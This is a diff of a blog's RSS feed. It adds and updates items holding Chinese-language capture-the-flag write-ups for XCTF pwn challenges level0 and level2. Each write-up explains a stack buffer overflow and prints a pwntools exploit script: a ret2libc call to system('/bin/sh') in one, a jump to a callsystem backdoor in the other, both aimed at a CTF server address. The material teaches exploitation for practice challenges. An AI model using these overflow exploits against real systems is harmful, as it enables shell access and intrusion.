@@ -6,10 +6,35 @@
     <description>Recent content on NiceSeven&#39;s Website</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 15 Jan 2020 19:03:07 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 15 Jan 2020 20:46:28 +0800</lastBuildDate>
     
 	<atom:link href="https://niceseven.github.io/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>XCTF Pwn Level2</title>
+      <link>https://niceseven.github.io/post/2020/01/15/xctf-pwn-level2/</link>
+      <pubDate>Wed, 15 Jan 2020 20:46:28 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/01/15/xctf-pwn-level2/</guid>
+      <description>level2 首先checksec一下查看开启了什么防护
+32位程序
+RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击
+RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表
+NX:内存栈不可执行保护机制，传入栈的数据不可直接执行意味着不能在栈上传shellcode执行，可以使用rop链绕过
+本地运行一下查看程序的功能
+运行程序后输出Input：，等待输入之后输出Hello,World
+拖入IDA分析
+进入vulnerable _function()函数查看
+跟level0一样的栈溢出漏洞，88h的栈可以写入0x100的数据明显的栈溢出
+查看是否有后门，shift+f12查看字符串，可以发现system函数与/bin/sh字符串
+但是这里的system函数参数没有写，需要我们自己将/bin/sh作为参数传入system函数，考查的是基础ROP中的ret2libc
+ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&amp;quot;/bin/sh&amp;rdquo;)，故而此时我们需要知道 system 函数的地址与字符串/bin/sh的地址
+本题有2个system函数地址，我们需要使用的是_system函数，因为它是属于plt段，若使用extern段的system无法getshell
+我们使用symbols()函数获取的地址是plt段中的_system
+写exp
+#!/usr/bin/python #coding=UTF-8 from pwn import * sh = remote(&amp;#39;111.198.29.45&amp;#39;,34150) elf = ELF(&amp;#39;./level2&amp;#39;) system_addr = elf.symbols[&amp;#39;system&amp;#39;] binsh_addr = next(elf.search(&amp;#39;/bin/sh&amp;#39;)) payload = &amp;#39;a&amp;#39; * 0x88 + &amp;#39;b&amp;#39; * 4 + p32(system_addr) + &amp;#39;c&amp;#39; * 4 + p32(binsh_addr) #0x88是填充栈，bbbb用来填充ebp，之后就是retn用system的地址覆盖，程序执行完之后就返回到system #在进入system函数之后，正常的调用会有一个返回的地址这里使用cccc覆盖掉 #最后就是将/bin/sh的地址作为system()的参数传入，如此一来栈溢出之后就会执行system(&amp;#34;/bin/sh&amp;#34;) sh.</description>
+    </item>
     
     <item>
       <title>XCTF Pwn Level0</title>
@@ -26,16 +51,7 @@
 漏洞很明显了一个80h的栈可以读入0x200的数据，明显的栈溢出
 我们查看程序有没有后门，shift+f12查看字符串存在callsystem()函数调用system(&amp;quot;/bin/sh&amp;rdquo;)
 编写exp
-#!/usr/bin/python #coding=UTF-8 from pwn import * sh = remote(&amp;#39;111.198.29.45&amp;#39;,45960) elf = ELF(&amp;#39;./level0&amp;#39;) #开启本地程序的句柄 callsystem_addr = elf.symbols[&amp;#39;callsystem&amp;#39;] #symbols函数用于获取获取一个标志的地址，这个标志可以是system函数、bss全局变量等 payload = &amp;#39;a&amp;#39;*0x80 + &amp;#39;a&amp;#39;*8 + p64(callsystem_addr) sh.recv() sh.sendline(payload) sh.interactive() 注意这里的payload填充0x80后还需要填充8个字节(64位)的数据来覆盖rbp，之后才是覆盖retn</description>
-    </item>
-    
-    <item>
-      <title>XCTF-Pwn-hello pwn</title>
-      <link>https://niceseven.github.io/post/2020/01/13/xctf-pwn-hello-pwn/</link>
-      <pubDate>Mon, 13 Jan 2020 17:39:52 +0800</pubDate>
-      
-      <guid>https://niceseven.github.io/post/2020/01/13/xctf-pwn-hello-pwn/</guid>
-      <description>test</description>
+#!/usr/bin/python #coding=UTF-8 from pwn import * sh = remote(&amp;#39;111.198.29.45&amp;#39;,45960) elf = ELF(&amp;#39;./level0&amp;#39;) #开启本地程序的句柄 callsystem_addr = elf.symbols[&amp;#39;callsystem&amp;#39;] #symbols函数用于获取获取一个标志的地址，这个标志可以是system函数、bss全局变量等 payload = &amp;#39;a&amp;#39;*0x80 + &amp;#39;a&amp;#39;*8 + p64(callsystem_addr) #sh.recv() sh.sendlineafter(&amp;#39;Hello, World\n&amp;#39;,payload)#接收到Hello, World之后传入payload sh.interactive()#接收shell 注意这里的payload填充0x80后还需要填充8个字节(64位)的数据来覆盖rbp，之后才是覆盖retn</description>
     </item>
     
     <item>
